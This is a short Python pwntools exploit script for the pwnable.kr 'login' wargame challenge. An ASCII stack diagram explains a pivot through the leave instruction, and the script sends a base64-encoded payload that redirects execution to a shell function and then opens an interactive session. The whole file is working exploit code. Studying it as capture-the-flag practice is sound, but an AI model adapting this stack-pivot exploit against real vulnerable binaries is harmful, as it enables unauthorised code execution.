#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
import base64

context.update(arch="i386", os="linux", bits=32)
# p = process("./login")
p = remote("pwnable.kr", 9003)

'''
+-------+
| stack |
+-------+

+--------+----------------+                                        +-------+    +-------+----------------+
| ebp-8  | junk           |                                  +---> | stack |--> | ebp   | old ebp        | mov esp, ebp(input address); pop ebp; return(input+8)
+--------+----------------+                                  |     +-------+    +-------+----------------+
| ebp-4  | shell address  |                                  |                  | ebp+4 | return address |
+--------+----------------+                                  |                  +-------+----------------+
| ebp    |  input address | leave => mov esp, ebp; pop ebp --+
+--------+----------------+
| ebp+4  | return address |
+--------+----------------+

'''

input_addr = 0x811eb40  # global input address
shell = 0x0804925f  # correct funtion address
junk = 0xdeadbeef

payload = p32(junk) + p32(shell) + p32(input_addr)
payload = base64.b64encode(payload)

p.recv()
p.sendline(payload)
print p.recvline()

p.interactive()
p.close()
